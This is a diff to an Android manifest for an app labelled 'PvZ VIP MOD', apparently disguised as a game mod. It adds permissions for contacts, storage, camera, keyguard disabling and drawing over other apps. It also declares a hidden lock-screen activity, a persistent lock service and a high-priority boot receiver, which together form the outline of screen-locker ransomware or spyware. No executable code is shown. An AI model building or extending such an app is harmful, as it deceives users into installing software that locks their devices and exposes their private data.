@@ -1,51 +1,66 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.pvzmod.game">
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.pvzmod.vip">
 
-    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <!-- Ruxsatlar -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.SHOW_WHEN_LOCKED" />
+    <uses-permission android:name="android.permission.TURN_SCREEN_ON" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
     <application
-        android:name=".LockService"
         android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
         android:label="PvZ VIP MOD"
-        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+        android:theme="@style/Theme.AppCompat.NoActionBar">
         
+        <!-- Main Activity (PvZ launcher) -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:launchMode="singleTask"
-            android:excludeFromRecents="true">
+            android:screenOrientation="portrait"
+            android:launchMode="singleTop">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-
+        
+        <!-- Lock Screen (qulf) -->
         <activity
             android:name=".LockScreenActivity"
+            android:exported="false"
             android:excludeFromRecents="true"
             android:launchMode="singleTask"
-            android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
-            android:stateNotNeeded="true"
+            android:noHistory="true"
             android:showOnLockScreen="true"
-            android:turnScreenOn="true" />
-
+            android:turnScreenOn="true"
+            android:screenOrientation="portrait" />
+        
+        <!-- Boot Receiver (qayta yuklashda ishga tushadi) -->
         <receiver 
-            android:name=".BootReceiver" 
-            android:enabled="true" 
+            android:name=".BootReceiver"
+            android:enabled="true"
             android:exported="true">
             <intent-filter android:priority="1000">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <data android:scheme="package" />
             </intent-filter>
         </receiver>
+        
+        <!-- Service (doimiy) -->
+        <service android:name=".LockService" />
+        
     </application>
 </manifest>
